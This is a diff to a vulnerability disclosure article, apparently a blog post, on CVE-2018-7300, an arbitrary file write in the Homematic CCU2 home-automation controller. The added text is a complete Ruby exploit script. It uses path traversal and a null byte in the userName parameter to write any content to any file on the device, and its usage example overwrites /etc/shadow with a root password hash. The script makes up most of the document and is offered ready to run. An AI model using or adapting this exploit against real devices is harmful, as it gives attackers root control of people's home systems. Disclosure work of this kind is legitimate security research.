@@ -36,6 +36,92 @@ exec echo $args(userLang)>/etc/config/userprofiles/$args(userName).lang
 
 This means that an attacker can create or overwrite arbitrary files on the CCU2's filesystem. Please note that full control over the target file name can be obtained by injecting a null byte into the userName argument in order to prevent the string ".lang" from being appended to the resulting file name. The file contents can be directly controlled via the userLang argument.
 
+# Proof-of-Concept
+
+~~~ ruby
+#!/usr/bin/ruby
+
+# Exploit Title: Homematic CCU2 Arbitrary File Write
+# Date: 28-03-18
+# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
+# Vendor Homepage: http://www.eq-3.de
+# Software Link: http://www.eq-3.de/service/downloads.html?id=268
+# Version: 2.29.23
+# CVE : 2018-7300
+
+# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite
+
+require 'net/http'
+require 'net/https'
+require 'uri'
+require 'json'
+
+unless ARGV.length == 3
+  STDOUT.puts <<-EOF
+Please provide url
+
+Usage:
+  write_files.rb <ip.adress> <file path> <content of the file>
+
+Example:
+  write_files.rb https://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'
+
+  or
+
+  write_files.rb http://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'
+
+EOF
+  exit
+end
+
+# The first argument specifies the URL and if http or https is used
+url = ARGV[0] + "/api/homematic.cgi"
+
+# The second argument specifies the file into which the content should be written
+homematic_file_path = ARGV[1]
+
+# The third argument specifies the content of the file
+homematic_file_content = ARGV[2]
+
+# define the json body for the attack
+body = {
+        "version": "1.1",
+        "method": "User.setLanguage",
+        "params": {
+                    "userName": "file path",
+                    "userLang": "file content"
+                  }
+        }.to_hash
+
+# define the traversal with the file you want to write
+body[:params][:userName] = "../../../../../../../.." + homematic_file_path + "\u0000"
+
+# define the content
+body[:params][:userLang] = homematic_file_content
+
+# split the uri to access it in a easier way
+uri = URI.parse(url)
+
+# define target connection, disabling certificate verification
+Net::HTTP.start(uri.host, uri.port, :use_ssl => uri.scheme == 'https', :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|
+
+  # define post request
+  request = Net::HTTP::Post.new(uri.request_uri)
+
+  # define the content type of the http request
+  request.content_type = 'application/json'
+
+  # define the request body
+  request.body = body.to_json
+
+  # send the request to the homematic ccu2
+  response = http.request(request)
+
+  # print response message code and status to cli
+  puts 'Response code: ' + response.code + ' ' + response.message
+end
+~~~
+
 # CVE
 
 [CVE-2018-7300](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7300)
